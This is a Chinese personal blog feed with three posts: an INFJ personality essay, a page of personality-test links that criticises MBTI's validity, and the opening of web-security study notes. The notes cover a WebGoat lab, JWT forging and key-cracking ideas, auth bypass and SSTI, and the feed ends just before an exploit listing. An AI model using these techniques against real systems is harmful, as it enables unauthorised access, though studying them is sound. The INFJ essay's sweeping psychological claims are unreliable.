的爱是建立在理解的基础上。产生兴趣之后，他们极可能会像跟踪狂一样翻阅对方过去所有的记录。他们会揣摩你每一条朋友圈背后藏着的情感和思想，关注你社交媒体上的一举一动。这种看似变态的 “跟踪” 行为，是因为他们想要去 “看透” 你，挖掘你隐藏在深处的东西。</p>\n<p>无论你灵魂的深处是如何的模样，只要他们 “看到” 的是真实的，纯粹不加任何掩饰的，他们就会突然从 10% 到 100% 加速爱上你。INFJ 中泛性恋存在的几率会很大，他们的爱不分性别，爱的是一个人在世上原本的存有。</p>\n<p>INFJ 极度渴望理解他人，也同样希望自己能够被理解。成长过程中的 INFJ 会察觉到自己真正的一面是不会被世上大多数人认同的，他们习惯性戴上社交面具融入到世俗当中。</p>\n<p>比起 “伪装”，我更愿意说这是 INFJ 的一种 “分裂”。他们是社交变色龙，会根据谈话对象的改变用不同的交流方式说话，说出自己其中的一部分。他们主动透露的那 “一部分” 通常是真实的，但不是完整的，不算是一种欺骗。</p>\n<p>INFJ 通常会陷入到身份认同危机里。热情又冷漠；世故又单纯；黑暗又光明；感性又理智，这些看似矛盾的词放在他们身上都成立，但大多数人只能看到其中的一项。他们就像一面破碎的镜子，交出去给别人看的都是碎镜子其中的一块，每块镜面里照出来的都是一部分真实的自我，却又都不完整。</p>\n<p>“我到底是一个怎么样的人呢？” 当他们从一个身份转向另一个身份的时候，有时连自己也搞糊涂。</p>\n<p>INFJ 常觉得自己像雾气飘荡在人世间，感觉不到自身确切的存在。而当一个值得信任的人出现了，INFJ 会逐渐把碎片一片片交付给对方，让破掉的镜子重圆。他们会让你看到平时不为人知的阴暗面，一些脑洞大开的稀奇古怪想法，还有许多疯狂的不理智。</p>\n<p>那时候，INFJ 才真正找到 “我”—— 只有在你的面前，我才能把所有身份黏合起来，看见完整的自己，才能感知到存在。INFJ 时刻注视着你，就像是在注视着一面完整的镜子，你会是那个把他们从身份危机中拯救出来的人，是驱散迷雾的太阳。</p>\n<p>“信任” 对于 INFJ 来说十分重要。获取他们信任的过程很缓慢，在交往的过程中，他们会通过你的言行来判断是否能把最真实的一面交给你。INFJ 对不太信任的人是温和的，撕开一层后是冷冰冰的礼貌疏离。</p>\n<p>能进入 “信任圈子” 的人非常的少，一只手都能数得过来。如果你有幸是这个小圈子里的一部分，你就能再撕掉 INFJ 的一层皮，进入到他们的内核，那里燃烧着炙热的火。到达这一层之后，你会获得 INFJ 绝对忠诚的爱。这种爱是毫无保留的奉献。</p>\n<p>你会是太阳，是世上独特的存有，他们会为你献上所有的注意力。在爱情中的 INFJ 会记着你无意中提到过喜欢的东西，作为惊喜送给你；认真听进去你的问题给出建议；你说过的书和电影他们会去看；他们会很想触碰你拥抱着你；会主动去了解构成 “你” 的一切微小事物，注视着你的过去和未来。</p>\n<p>INFJ 的忠诚几乎是无条件的。举个夸张的例子，如果你想要毁灭世界，他们会认真的确定你是否真的这么想。如果你真的确定，那么你的目标就是他们的目标，你的需求会被放在首位，他 / 她会支持你的决定，做你幕后的军师出谋划策给出详细的方案。</p>\n<p>INFJ 的爱情观听起来好像这么不真实，充满戏剧性，但这就是事实。这个事实对于 INFJ 来说是不幸的，对于他人来说是幸运的。很多人并不会去欣赏这种热烈到会灼烧人的情感，了解过后觉得吓人，甚至认为是假的。</p>\n<p>但对于 INFJ 而言，没人会比自己更懂自己想要追求的那种理想的感情。这也意味着看似挺聪明的 INFJ 在恋爱中的自我保护意识是真的挺糟糕的。</p>\n<p>只要不背叛 INFJ，他们几乎能原谅所有你做错的事情。每个 INFJ 都会在心中建立自己一套关于背叛的准则，而欺骗通常对他们而言是一种不能容忍的背叛。INFJ 灵敏的直觉能瞬间看透对方言行中的虚伪和恶意的操控，他们会对说谎者产生一种无法挽回的陌生感，联结瞬间断裂。</p>\n<p>被背叛后，信任会被全部撤销，感情瞬间降温到零度。没有任何警示就突然切断所有联系，是 INFJ 著名的 “door slam” 行为。他们曾经的爱的很深，给予的是 100%，但他们决定走出来了，断的也是彻彻底底，你就像在他们世界里消失了一样。</p>\n<p>心碎掉的 INFJ 会暂时陷入到封闭的世界里，他们会对关系里发生过的事情进行理智的分析和判断，减少情绪上的失衡。这段时间的他们会表现得像 ISTP，沉迷感官的刺激和享乐，对待他人内心冷漠得像机器，在情感上存在一种完全的隔离。</p>\n<p>INFJ 的爱情通常是有目标导向的。他们想要看到关系中 “持续” 的可能性。不考虑结婚的 INFJ 会寻求一种精神上的永恒，那是一种异常强烈浪漫的情感。而如果 INFJ 想要步入婚姻，他们会综合考虑很多现实和理想的因素，期待能遇见完全接纳自己整个存有的他 / 她，这是不容易的，但也绝非无可能。婚姻对 INFJ 最可怕的恐怕是，睡在床边的另一半，你到死也摸不清他们真实的模样。</p>\n<h3 id=\"性格总结\"><a class=\"markdownIt-Anchor\" href=\"#性格总结\">#</a> 性格总结</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NDcxMjQ5Nzk=\">https://zhuanlan.zhihu.com/p/447124979</span></p>\n<p>喜欢记录。喜欢文字，而不是口头表达，不擅长即兴发挥。文字会给 infj 一种放松平和的感觉。infj 文字具有人文主义关怀，喜欢通过文字对人进行启迪和指引。</p>\n<p>喜欢深邃的东西，比如凌晨的夜空。很喜欢那种静谧，仿佛全世界都在沉睡，只有自己清醒。“人们因为好奇凝望深渊，很多时候 infj 就是深渊本身，他们的潜意识害怕深渊也害怕自己”</p>\n<p>知道如何跟人相处，也知道如何高效融入社会，但是本质还是内向的，社交对 infj 是消耗能量的，结束社交后 infj 不想说话，需要独处时间进行放松和充电。</p>\n<p>跟人有疏离感，不管是老友还是刚刚认识的，总会有一层距离。infj 很难进入一段亲密关系，骨子里永远是疏离感，自己的个人领域别人是不可以进来的。可能属于人格隐藏。infj 骨子里只信任自己，不信任任何人。</p>\n<p>具有多重人格面具。处于不同的圈子会戴不同的面具，每到一个新的阶段，每遇到一批完全不同的人，就会扮演一个不同的角色，有时候表演过程逼真的感觉自己就是这样的人。如果 infj 不告诉你他们的真实性格，你永远也不知道他们是 infj。infj 完全可以在社交场合展现出完全的外向人格。infj 的人际其实都是在模仿和表演，所以人们很难发现真实的 infj.</p>\n<p>判断一个人是不是 infj, 不是看他在人群中是什么样子，而是看他独处时是什么样子，这就是人格面具。</p>\n<p>擅长伪装，展现给别人的永远是自己想要对方看到的，哪怕是发怒等过激行为，都是在计划中。</p>\n<p>infj 在不同圈子会有不同的面具，如果在一个圈子里他喜欢一个人，但是脱离了这个圈子，infj 会换上另一个面具，就不喜欢你了。和 infj 谈恋爱，不管男女，靠的是占据她的空余时间，不能让一个 infj 一个人呆的太久，否则她就去研究真理去了。</p>\n<p>对朋友的态度是君子之交淡如水，但是 infj 又可以轻易带上面具成为以一个人的朋友，如果他愿意的话，可以与很多人聊得火热。infj 可以与人短时间内成为好朋友，但是这种关系维持不久。只有非常少的要好的朋友，大部分都是表面朋友。</p>\n<p>infj 具有天然的感知能力，能够感觉到你的能量组成是什么，所以如果 infj 愿意，完全可以伪装成你喜欢的样子。infj 能感知到谁对自己有好感，谁排斥自己。</p>\n<p>喜欢察言观色，装傻充愣，扮猪吃老虎。</p>\n<p>会对哲学、玄学、心理学感兴趣，且有天赋。喜欢新鲜事物，容易被神秘的事物吸引。</p>\n<p>外热内冷，聊天表面上可以热火朝天，内心却毫无波澜。</p>\n<p>讨厌吵架，控制不住情绪爆发时挺可怕，一般很少有人会看到 infj 情绪失控，infj 会尽可能避免使自己情绪失控的场景，一般这种情况出现在家中。</p>\n<p>infj 太关注自我世界，很容易出现抑郁或者狂躁，因此很容易出现双向情感障碍。极度热心和极度封闭两个极端反复摇摆。受到外界刺激，infj 会进行自我封闭。</p>\n<p>infj 一定要早点认识自己，把自己保护起来。羊说羊知道：双相情感障碍</p>\n<p>infj 可以喜欢一个人，一个物，但是当面临取舍的时候，会毫不犹豫的舍弃。infj 不会为了某个人放弃自己的原则。</p>\n<p>道德感极强，时间观念极强。</p>\n<p>有一套自洽的逻辑体系，用来解释世界的运行机制与人际关系处理，当发现事情发展有悖于自己预期时，会不断修改完善自己的逻辑框架。</p>\n<p>同理心很强，会不由自主换位思考。兼容性好，能够接受很多别人不能接受的东西。</p>\n<p>会吸收他人情绪，很容易受到周围能量场影响。周围人兴奋，infj 也会跟着兴奋</p>\n<p>喜欢用因果分析法，解构人的心理，结构事情。</p>\n<p>极少有 infj 能够得到正确的培养，所以大部分 infj 会或多或少都拥有不幸的童年。</p>\n<p>大局观好，喜欢掌握全局梗概，同时也容易忽略细节。喜欢加深对世界的理解，免于家长里短的琐事的干扰。</p>\n<p>很容易辨别出一句话的价值，哪些是谎言，那些是真理，哪些是对的，那些是对自己有利的。擅长使用隐喻来描述人和事，能够很容易看到事物的本质。</p>\n<p>不太能理解众人眼中的浪漫的点，一上来就会考虑未来，开始就是老夫老妻模式。</p>\n<p>孤独，但不孤单，甚至有点享受孤独。喜欢独处，但是不怕社交。只是社交对 infj 是消耗能量的，所以无论什么社交，结束之后 infj 都会很累，不想说话。孤独对 infj 来说就是氧气。</p>\n<p>思想比较成熟，知道的太多，想的太多，很难找到一个可以交流全部思想的人。</p>\n<p>对过去痛苦经历记忆深刻，为了使自己从过去痛苦回忆解脱，常常强迫自己更多着眼于未来。如果童年做了后悔的事，长大了一旦闲下来就会在大脑中自动播放。</p>\n<p>经常自我批判，喜欢解剖自己，比如是什么促使他成为现在的样子，什么塑造了自己的性格。</p>\n<p>积极向上，但是深知社会的邪恶。“人和树一样，越是向往高处的阳光，它的根就越要伸向黑暗的地底”</p>\n<p>“infj 真的还是个老千层饼，你以为他是 enfj，扒开是 intj，你以为你懂了。再来发现人家是 intp，你又以为你懂了，结果又变成 infp 了。你迷糊了，其实人家是 infj”</p>\n<p>对人性敏锐，不需别人开口，就能察觉出别人细微的感受。善于读懂别人的情绪和感受，善于挖掘别人内心深处的想法。对人性把握深刻，能够看到别人的未来，喜欢作为别人精神世界的引路人。希望看到被自己帮助的人自己觉醒。</p>\n<p>infj 擅长倾听，很多时候人们在 infj 面前会放下戒备，将埋藏在内心的秘密告诉 infj。</p>\n<p>重视美感和质感。infj 是极简主义者，宁愿拥有一些美好的东西，也不愿一堆廉价的东西。</p>\n<p>经常有睡眠和注意力不集中问题</p>\n<p>是观察者而不是参与者，喜欢观察人生百态。</p>\n<p>“狂热又忠诚，脆弱又强大，慈悲又冰冷，友善又疏离”，看似矛盾的词放到 infj 身上都完全成立，infj 的人格面具使得大部分人看到的都只是其中一部分，infj 就像一面破碎的镜子，展示给不同人的都是不同的碎块。</p>\n<p>INFJ 可能非常喜欢你，但 INFJ 不会让自己没有后路</p>\n<p>infj 的社交模式是一对一的辐射性的，infj 喜欢拥有一个交往深厚、持久的小规模的朋友圈，因为这样有利于他们将丰富的内心情感表达出来，即他们喜欢深度交流。</p>\n<p>infj 聊天时喜欢把话题引到别人身上，这个时候 infj 是自信的，但是当话题回到自己身上时，会感到不自在，因为 infj 心中有太多私密的东西。</p>\n<p>infj 遇到人际矛盾时，第一反应是挫败感，因为这意味着自己对心理的研究以及操控能力是失败的。</p>\n<p>infj 形成原因 —— 不适的爱。INFJ 是在圣人之训和 “正义温暖” 下长大的，但是他看到了圣人之训的真正含义，也看到了 “正义温暖” 下的究竟是怎样的本质，因此慈悲但又有着黑暗的一面。</p>\n<p>INFJ 好像天鹅 —— 清冷，柔和，稀有，神秘</p>\n<p>知道自己的自私，也能接受别人的自私，但是不能接受别人要求自己无私</p>\n<p>大概率会有一个强势的母亲，以及一个冷漠的父亲。</p>\n<p>infj 大概是宫斗剧中能够赢到最后的角色，攻击性不强，控制欲不弱，能够适时放弃权利和利益，以退为进。</p>\n<p>不圣母，讨厌长期低能量的人，并不会因为对方悲惨产生保护欲，因为自己不能从对方获取能量。</p>\n<p>善于诱导，放长线钓大鱼。别人以为你是为了他好，其实 infj 有着自己隐晦的目的和利益。</p>\n<p>infj 思考一个问题要很久，做决定的时候犹犹豫豫。</p>\n<p>infj 对外人总是很客气，对家里人却很不客气。</p>\n<p>infj 容易上头，上头了吵架就往死里闹。</p>\n<p>固执，不懂得及时止损。</p>\n<p>infj 形成的原因之一就是他们从小受到控制被打压，又无力反抗，所以封闭了自己的向外社交能力以达到自保。</p>\n<p>所以 infj 通常表现出来的友善，温和，都是内心惧怕冲突，回避冲突，害怕抗争的程度。</p>\n<p>infj 也会有爆发时会特别恐怖，因为压抑太久了。</p>\n<p>infj 是高自尊高敏感，自卑又自恋的一群人。</p>\n<h3 id=\"致命吸引力\"><a class=\"markdownIt-Anchor\" href=\"#致命吸引力\">#</a> 致命吸引力</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzU1Nzc3ODUxMA==\">https://www.zhihu.com/question/557778510</span></p>\n<p>INFJ 四大致命吸引力：神秘、美孤独、暗黑</p>\n<p>神秘体质</p>\n<p>INF 认知现实世界的方式极其独特，与现代科学以事实为依据来推演和思考不同，INFJ 更擅长和信赖直觉意象梦境和符号。当潜意识以图像的方式突然降临于脑海中，INFJ 自身都无法参透这种路径，但会讨图解析，并在现实中加以验证，最终形成世界观。在古代，INFJ 可能会成为部落中的萨满 / 祭司。</p>\n<p>荣格将这种直觉 (Ni) 称为 &quot;预言家功能&quot;。如何用它更准确地洞察世界，并应对其带来的不安，是 INFI 们</p>\n<p>的终身课题。</p>\n<p>美的气韵</p>\n<p>INFJ 有很强的审力，他们关注外表，认为外表也是内心特质的一种体现。成年后，INFJ 对自己的审美方向会逐渐清晰，当自我认知迈入一个新阶段，他们的审美情趣也会随之转向，并维持一 - 段时间，不会随意改变风格。</p>\n<p>INFJ 对美的执着也体现在抽象层面上。一件事一段关系、一份学业职场经历，一种思想历程，INFJ 无一不追求完美。 或者说，追求一种有始有终，有秩序有原则的闭环的美。无论是人还是事，最后都结束得清清楚楚，是爱是恨，都不留遗憾，做到彻底。虽然通往这一结果的思索过程极其痛苦，但是为了最后的完满，INFJ 认为值得。</p>\n<p>孤独气场</p>\n<p>INFJ 周身散发出一种遗世独立的气质，这种孤独并非孤单寂寞，而是有一种距离感。他们虽然会友善地回应陌生人，但很有边界感，他人休想轻易地走入他们内心，无关人等的情绪和想法很难影响到他们。INFJ 需要这种孤独。与人群保持一定距离时，INFJ 可以沉浸在思想或艺术的世界中，去感受、思考和沉淀。如果你想要走进 INFJ，你需要懂得他的这种需求，知道什么时候可以靠近，什么时候只需远远守护，给他们独处的空间。</p>\n<p>暗黑气质</p>\n<p>INFJ 的妆容、眼神和内心都透出一股暗黑气质。与 NFP&quot;小天使’&quot; 不同，他们有一种中世纪暗黑大天使的气质。他们对人类的爱是大爱，是抽象层面上的，但在现实环境中，人性的暗面往往令 INFJ 愤怒，具体的现实人群让他们感到麻木，甚至厌烦。他们爱护个体的脆弱的美，会用自己的大翅膀护住，但若有人不识时务蹬鼻子上脸，暗黑大天使也会毫不留情地让其滚粗。</p>\n",
            "tags": [
                "INFJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2023/04/01/MBTI/%E5%BF%83%E7%90%86%E5%AD%A6%E6%B5%8B%E8%AF%95/",
            "url": "http://www.n1h1l157.live/2023/04/01/MBTI/%E5%BF%83%E7%90%86%E5%AD%A6%E6%B5%8B%E8%AF%95/",
            "title": "心理学测试",
            "date_published": "2023-03-31T16:00:00.000Z",
            "content_html": "<p>心理测试入口，可以方便的跳转到测试 MBTI、八维、九型测试网址。</p>\n<h3 id=\"测试入口地址\"><a class=\"markdownIt-Anchor\" href=\"#测试入口地址\">#</a> 测试入口地址</h3>\n<h4 id=\"mbti测试\"><a class=\"markdownIt-Anchor\" href=\"#mbti测试\">#</a> MBTI 测试</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuMTZwZXJzb25hbGl0aWVzLmNvbS9jaA==\">https://www.16personalities.com/ch</span></p>\n<h4 id=\"九型人格测试\"><a class=\"markdownIt-Anchor\" href=\"#九型人格测试\">#</a> 九型人格测试</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXJlYWxtZS5jb20vZW5uZWFncmFtLXRlc3QvY24v\">https://www.arealme.com/enneagram-test/cn/</span></p>\n<h4 id=\"荣格斯八维测试\"><a class=\"markdownIt-Anchor\" href=\"#荣格斯八维测试\">#</a> 荣格斯八维测试</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuanVuZ3VzLmNuL3poLWhhbnMvdGVzdC8=\">https://www.jungus.cn/zh-hans/test/</span></p>\n<h4 id=\"totypes八维测试\"><a class=\"markdownIt-Anchor\" href=\"#totypes八维测试\">#</a> Totypes 八维测试</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50b3R5cGVzLmNvbQ==\">http://www.totypes.com</span></p>\n<h3 id=\"自我辩证mbti\"><a class=\"markdownIt-Anchor\" href=\"#自我辩证mbti\">#</a> 自我辩证 MBTI</h3>\n<ol>\n<li>\n<p>缺乏靠谱及实证检验的理论；</p>\n</li>\n<li>\n<p>简单二分归类，边界设定随意：人格向度该是连续的，真要分类的话人格有∞无限种，随意二分归类流失了太多信息；</p>\n</li>\n<li>\n<p>对工作表现等人生结果的预测力差；</p>\n</li>\n<li>\n<p>忽略了神经质 / 情绪稳定性这一重要向度，因为这个向度一般看来是有较为明显的好坏倾向的，并且对于 life outcome 预测度较好，避而不谈当然是为了迎合大众；</p>\n</li>\n<li>\n<p>重测一致性差（人格的概念是在一定时间跨度内较为稳定存在的，但是 mbti 可能隔个几个月重测会有一半的人得到跟之前测得不一致的类型，信效度可想而知）；</p>\n</li>\n<li>\n<p>简单划分为 16 类，完全低估了同类型人格下的差异；</p>\n</li>\n</ol>\n<h3 id=\"我对mbti的看法\"><a class=\"markdownIt-Anchor\" href=\"#我对mbti的看法\">#</a> 我对 MBTI 的看法</h3>\n<p>1）可以测，但不能当成人生教科书。</p>\n<p>2）可以重点参考结果里能给自己的生活带来帮助的部分，比如没有察觉到的自身优势。</p>\n<p>3）也可以用它去理解自己跟别人交往时遇到的困惑。</p>\n<p>4）但是如果觉得答案跟真实的自己并不符合，那也完全可以，不要被测试结果捆绑住手脚。</p>\n<p>5）更不用把它作为 “标准答案”，以此指导自己的职业恋爱生活。</p>\n<p>6）MBTI 只是一个粗略的分类工具，肯定不能包含 “所有人的所有情况”。世界上这么多人，每个人都是很不一样的，怎么可能只有 16 种呢？</p>\n<p>7）而任何工具，当然也包括心理学工具，都是为了服务具体的人。如果把这些 “尺子” 当成目的，忘记了每个人的情况都是独一无二的，那就有点本末倒置啦。</p>\n<h3 id=\"错误使用mbti案例\"><a class=\"markdownIt-Anchor\" href=\"#错误使用mbti案例\">#</a> 错误使用 MBTI 案例</h3>\n<p>问：各 mbti 排名第一的天赋分别是什么？</p>\n<p>答：看看这个问题，就知道什么叫 “小丑” 对内卷和争高低的执着。</p>\n<p>答：想被夸就直说，别整这些没用的，就好像和爱因斯坦一个人格就能达到爱因斯坦一样的成就一样。</p>\n<p>答：那当然是 imsb 啦。</p>\n",
            "tags": [
                "心理测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/",
            "title": "XD22 1 Web 基础知识",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"javaweb\"><a class=\"markdownIt-Anchor\" href=\"#javaweb\">#</a> JavaWeb</h3>\n<h4 id=\"部署-webgoat\"><a class=\"markdownIt-Anchor\" href=\"#部署-webgoat\">#</a> 部署 webgoat</h4>\n<ul>\n<li>环境下载并 webgoat 启用环境</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">webgoat 下载地址</span></span><br><span class=\"line\">https://github.com/WebGoat/WebGoat</span><br><span class=\"line\">/usr/libexec/java_home -v 19 --exec java -jar webgoat-server-8.2.2.jar --server.address=192.168.0.102 --server.port=9091</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">打开url并注册新用户</span></span><br><span class=\"line\">http://127.0.0.1:9091/WebGoat/login</span><br><span class=\"line\">http://192.168.0.102:9091/WebGoat/start.mvc#lesson/PathTraversal.lesson/</span><br></pre></td></tr></table></figure>\n<p><strong>注意如果是本地回环地址无法抓取到数据包，需要切换成本地 ip 地址</strong></p>\n<h4 id=\"jar-文件反编译\"><a class=\"markdownIt-Anchor\" href=\"#jar-文件反编译\">#</a> jar 文件反编译</h4>\n<p>拿到 jar 文件，先用 unzip 进行解压，用 IDEA 工具将其打开；<br>\n对照数据包，定位 url 如 / WebGoat/PathTraversal/profile-upload-remove-user-input；<br>\n在 java 源码中定位到 PathTraversal 的库文件，并右键加载为库后可查到源代码；<br>\n在 PathTraversal 中查看 ProfileUploadRemoveUserInput 方法看起功能，对照 html 界面查看传参规则及限制进行绕过。</p>\n<h4 id=\"jwt-使用及攻击\"><a class=\"markdownIt-Anchor\" href=\"#jwt-使用及攻击\">#</a> jwt 使用及攻击</h4>\n<ul>\n<li>jwt 说明<br>\n jwt 是用来判断当前的用户是游客、注册用户还是管理员的，写在 cookie 部分，由三部分组成，分别为 header 加密算法、payload 内容，signature 签名组成，中间由小数点隔开，可在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8=\">https://jwt.io</span> 上看这个 jwt 的具体内容是什么。</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">jwt 例子</span></span><br><span class=\"line\">eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2NjU0NTczMzIsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.CsmBkpcCp8WXKrbN4QZ-qDRUA0n1O-f0YUwIFHyVVvZyuUNay3zlTrkQrd-oVyG5YMUMDckXvsXRbjZS378Vcw</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">详细可参考</span> </span><br><span class=\"line\">https://www.cnblogs.com/vege/p/14468030.html</span><br></pre></td></tr></table></figure>\n<ul>\n<li>jwt 攻击</li>\n</ul>\n<p>（1）签名没验证空加密<br>\n可寻找相关脚本尝试空加密，但是这种概率非常小；</p>\n<p>（2）爆破密匙:<br>\n 如果能够获取到源码拿到加密算法中的加密密匙，可以寻找相关脚本进行破解密钥，由密匙和高级管理用户重新生成 jwt 来跳过身份验证；<br>\njwt 密钥爆破工具链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy\">https://github.com/brendan-rius/c-jwt-cracker</span></p>\n<p>（3）KID 利用:<br>\nkid 参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者可以读取到系统的任意文件的</p>\n<h4 id=\"javaweb-其他漏洞\"><a class=\"markdownIt-Anchor\" href=\"#javaweb-其他漏洞\">#</a> javaweb 其他漏洞</h4>\n<p>（1）目录遍历：有的目录做了限制只能解析 jpg/png 文件，但是在上传文件时跳过了这个限制，将文件上传到了其他目录，而其他目录也有可能是可以解析脚本语言的。</p>\n<p>（2）认证绕过：将用户上传的数据与数据库比对，如果用户上传的两个键值在数据库中不存在即 a=null&amp;b=null，则可以伪造两个数据库不存在的 key 值进行认证绕过。</p>\n<p>（3）组件漏洞：java 的组件有很多，如 log 4 j、xstream 等 jar 包存在安全漏洞的话，则可以通过寻找相关漏洞版本的 poc 尝试漏洞利用。</p>\n<p>（4）其他中高危：不安全的反序列化、XML 外部实体、访问控制（隐藏属性、越权）。</p>\n<h3 id=\"javascript\"><a class=\"markdownIt-Anchor\" href=\"#javascript\">#</a> javaScript</h3>\n<h4 id=\"js渗透知识\"><a class=\"markdownIt-Anchor\" href=\"#js渗透知识\">#</a> js 渗透知识</h4>\n<p>（1）什么是 js 渗透<br>\n在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏 洞 JS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。所以相当于 JS 开发的 WEB 应用属于 白盒测试 (默认有源码参考)。</p>\n<p>（2）如何判定 JS 开发应用<br>\n插件 wappalyzer、源代码简短、引入多个 js 文件、一般有 /static/js/app.js 等顺序的 js 文件、cookie 中有 connect.sid。</p>\n<p>（3）如何利用 js 代码<br>\n寻找接口，手机号码登录，验证码接收等文件，验证对方逻辑、或逻辑考 虑不全面的地方；如根据返回的验证码是 200 判断验证码有效，则可以测试修改返回包中的验证码返回值是否能绕过，如有一个重置手机号密码的 url 地址，可以直接访问测试是否有认证限制；也可以寻找框架漏洞测试如 node.js/vue.js， 框架漏洞较少。</p>\n<h4 id=\"js文件获取\"><a class=\"markdownIt-Anchor\" href=\"#js文件获取\">#</a> js 文件获取</h4>\n<p>（1）如何获取更多的 JS 文件？<br>\nJsFinder、Packer-Fuzzer、扫描器后缀替换字典</p>\n<p>（2）如何快速获取价值代码？</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">快速获取有价值的js代码</span></span><br><span class=\"line\">method:&quot;get&quot;、http.get(&quot;</span><br><span class=\"line\">method:&quot;post&quot;、http.post(&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">.ajax</span></span><br><span class=\"line\">service.httppost、service.httpget</span><br></pre></td></tr></table></figure>\n<p>（3）js 安全漏洞<br>\n前端验证修改返回数据包、URL 地址泄漏、未授权访问、框架漏洞</p>\n<h3 id=\"python\"><a class=\"markdownIt-Anchor\" href=\"#python\">#</a> python</h3>\n<h4 id=\"pyc-文件反编译\"><a class=\"markdownIt-Anchor\" href=\"#pyc-文件反编译\">#</a> pyc 文件反编译</h4>\n<ul>\n<li>PY 反编译 PYC 编译文件反编译源码<br>\n pyc 文件是 py 文件编译后生成的字节码文件 (byte code)，pyc 文件经过 python 解释器最终会生成机器码运行。因此 pyc 文件是可以跨平台部署的，类似 Java 的.class 文件，一般 py 文件改变后，都会重新生成 pyc 文件。</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">pyc反编译平台：</span></span><br><span class=\"line\">https://tool.lu/pyc/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">pyc反编译工具：</span></span><br><span class=\"line\">https://github.com/wibiti/uncompyle</span><br><span class=\"line\">https://github.com/rocky/python-uncompyle</span><br></pre></td></tr></table></figure>\n<h4 id=\"ssti模板注入\"><a class=\"markdownIt-Anchor\" href=\"#ssti模板注入\">#</a> SSTI 模板注入</h4>\n<p>（1）什么是 SSTI? 有什么漏洞危害？<br>\n 漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作 为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执 行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执 行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>\n<p>（2）如何判断检测 SSTI 漏洞的存在？<br>\n 输入的数据会被浏览器利用当前脚本语言调用解析执行</p>\n<p>（3）SSTI 安全问题在生产环境那里产生？存在模版引用的地方，<br>\n如 404 错误页面展示<br>\n存在数据接收引用的地方，如模版解析获取参数数据<br>\n一般需要获取到源码之后再去分析漏洞产生的地方，黑盒测试比较难发现</p>\n<h4 id=\"ssti利用代码\"><a class=\"markdownIt-Anchor\" href=\"#ssti利用代码\">#</a> SSTI 利用代码</h4>\n<p>漏洞详情：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hvdXlhbmh1YTEvYXJ0aWNsZS9kZXRhaWxzLw==\">https://blog.csdn.net/houyanhua1/article/details/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span 